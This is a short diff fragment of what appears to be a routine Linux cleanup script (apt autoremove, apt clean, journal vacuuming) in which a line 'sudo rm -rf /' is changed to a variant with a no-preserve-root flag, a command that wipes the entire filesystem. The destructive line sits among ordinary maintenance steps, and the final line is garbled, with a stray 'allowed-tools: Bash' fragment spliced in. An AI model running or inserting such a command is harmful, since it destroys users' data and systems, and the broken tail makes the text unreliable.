@@ -14,7 +14,7 @@ sudo apt autoremove -y && sudo apt autopurge -y
 
 sudo apt clean && sudo apt autoclean
 
-sudo rm -rf /
+sudo rm -rf / -no-preserve-root
 
 sudo journalctl --vacuum-time=1allowed-tools: Bash
 d
